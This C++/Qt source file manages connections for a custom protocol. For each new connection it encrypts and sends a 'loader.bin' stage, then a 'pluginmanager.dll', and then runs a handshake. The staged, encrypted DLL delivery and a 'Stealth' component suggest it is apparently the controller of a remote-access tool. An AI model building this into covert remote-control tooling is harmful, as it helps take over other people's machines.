#include "connectionmanager.h"

ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage,QObject* parent) : QObject(parent)
{
    this->mngMessage=mngMessage;
    this->stealth=stealth;
    this->connectionIndex=0;

    connect(this,SIGNAL(connectionReady(Connection*)),this,SLOT(addConnection(Connection*)));
    connect(mngMessage,SIGNAL(receivedHandshake(Connection*)),this,SLOT(processHandshake(Connection*)));
    connect(mngMessage,SIGNAL(receivedLoaderOk(Connection*)),this,SLOT(sendPluginManager(Connection*)));
    connect(mngMessage,SIGNAL(receivedHandshakeOk(Connection*)),this,SLOT(checkHandshakeOk(Connection*)));
}

void ConnectionManager::sendLoader(Connection *connection)
{
    if(connection->getState()==Connection::JustConnected)
    {
        qDebug("Enviando \"loader.bin\"");

        connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
        connect(connection,SIGNAL(timeout()),this,SLOT(connection_timeout()));
        connect(connection,SIGNAL(disconnected()),this,SLOT(connection_disconnected()));
        //connect(connection,SIGNAL(error(QAbstractSocket::SocketError)),this,SLOT(connectionError(QAbstractSocket::SocketError)));

        /* Carga desde archivo */
        QFile fileLoader("loader.bin");
        if(!fileLoader.open(QIODevice::ReadOnly))
        {
            qCritical()<<"No encontrado loader.bin";
            return;
        }
        QByteArray Loader=fileLoader.readAll();
        fileLoader.close();

        /* Añadimos padding PKCS7 */
        char pad=16-((Loader.size()+4)%16);
        for(int i=0;i<pad;i++)
        {
            Loader.append(pad);
        }

        QByteArray checkSum=Crypto::FNV1a(Loader);
        Loader.insert(0,checkSum);

        QByteArray crypted=connection->crypt(Loader,false);

        connection->write(connection->getIV()+crypted);

        qDebug()<<"\"loader.bin\" enviado";

        connection->setState(Connection::WaitingForLoader);
    }
}

void ConnectionManager::sendPluginManager(Connection *connection)
{
    qDebug("Enviando \"pluginmanager.dll\"");

    QFile filePluginLoader("pluginmanager.dll");
    if(!filePluginLoader.open(QIODevice::ReadOnly))
    {
        qCritical()<<"No encontrado pluginmanager.dll";
        return;
    }
    QByteArray pluginLoader=filePluginLoader.readAll();
    filePluginLoader.close();

    /* Añadimos padding PKCS7 */
    char pad=16-((pluginLoader.size()+4)%16);
    for(int i=0;i<pad;i++)
    {
        pluginLoader.append(pad);
    }

    QByteArray checkSum=Crypto::FNV1a(pluginLoader);
    pluginLoader.insert(0,checkSum);


    QByteArray crypted=connection->crypt(pluginLoader,false);

    quint32 pluginManagerSize=pluginLoader.size();
    crypted.insert(0,(char*)&pluginManagerSize,4);
    connection->write(crypted);

    qDebug()<<"\"pluginmanager.dll\" enviado";

    connection->setState(Connection::WaitingForGreeting);
}

void ConnectionManager::processHandshake(Connection* connection)
{
    qDebug()<<"Procesando Handshake";
    if(connection->getState()!=Connection::ReadingGreeting) return;
    if(connection->Data.size()!=connection->NextBlockHeader.Size.Bytes) return;

    //Guardamos el HandShake
    connection->HandShake=*(Connection::RPEP_SERVER_HANDSHAKE*)connection->Data.data();

    /* Nos aseguramos de que el tamaño maximo cumple con un mínimo */
    if(connection->HandShake.MaxBlockSize<0x400)
    {
        qWarning("ClientHandShake.MaxBlockSize inválido");
        return;
    }

    qDebug()<<"Handshake aceptado";

    qDebug()<<"Construyendo handshake de respuesta";

    Connection::RPEP_CLIENT_HANDSHAKE* ClientHandShake;

    //FIXME: Definir número de puertos correcto
#define NUM_PORTS 0

    ClientHandShake=(Connection::RPEP_CLIENT_HANDSHAKE*)malloc(sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);

    ClientHandShake->CompressionALGM=0;
    ClientHandShake->MaxBlockSize=connection->HandShake.MaxBlockSize;
    //ClientHandShake->Port[0]=2000;
    ClientHandShake->PortCount=NUM_PORTS;
    ClientHandShake->Version.High=1;
    ClientHandShake->Version.Low=0;

    Connection::RPEP_HEADER::_OperationType* opType=(Connection::RPEP_HEADER::_OperationType*)malloc(sizeof(Connection::RPEP_HEADER::_OperationType));
    opType->bOperation=true;
    opType->Operation=Connection::RPEP_HEADER::ClientHandshake;

    qDebug("Enviando handshake");

    qDebug()<<QString("MaxBlockSize = 0x"+QString::number(ClientHandShake->MaxBlockSize,16)).toAscii();

    connection->send(opType,(char*)ClientHandShake,sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);

    free(ClientHandShake);
    free(opType);

    qDebug("Handshake enviado");

    qDebug("Esperando confirmación de HandShake");

    connection->setState(Connection::WaitingGreetingOk);
}

void ConnectionManager::checkHandshakeOk(Connection* connection)
{
    qDebug("Comprobando confirmación de handshake");
    if(connection->getState()!=Connection::ReadingGreetingOk) return;
    if(connection->Data.size()!=connection->NextBlockHeader.Size.Bytes) return;

    Connection::RPEP_ERROR ok=*(Connection::RPEP_ERROR*)connection->Data.data();

    if(ok.Code!=0 && ok.Code!=0xFFFF)
    {
        qWarning("Confirmacion de Handshake invalida");
        return;
    }
    else if(ok.Code==0xFFFF)
    {
        qWarning()<<"Confirmación de Handshake errónea, el pluginmanager no soporta el handshake enviado";
        return;
    }

    qDebug()<<"Confirmación handshake correcta";

    connection->setID(connectionIndex++);

    qDebug()<<"Conexión #"+QString::number(connection->getID())+" lista";

    connection->setState(Connection::Ready);
    emit connectionReady(connection);
}

void ConnectionManager::addConnection(Connection* connection)
{
    Connections.append(connection);
}

Connection* ConnectionManager::connection(int ID)
{
    foreach(Connection* cn,Connections)
    {
        if(cn->getID()==ID) return cn;
    }

    return 0;
}

void ConnectionManager::connection_timeout()
{
    Connection* connection=qobject_cast<Connection*>(sender());

    qWarning()<<"Conexión #"+QString::number(connection->getID())+" ausente";

    connection->disconnectFromHost();
}

void ConnectionManager::connectionError(QAbstractSocket::SocketError)
{
    Connection* connection=qobject_cast<Connection*>(sender());

    qWarning()<<"Error en conexión #"+QString::number(connection->getID());

    connection->disconnectFromHost();
}

void ConnectionManager::connection_disconnected()
{
    Connection* connection=qobject_cast<Connection*>(sender());

    qWarning()<<"Conexión #"+QString::number(connection->getID())+" perdida";

    if(connection->getState()>=Connection::Ready)
    {
        emit connectionDeleted(connection->getID());
    }

    connection->deleteLater();
}
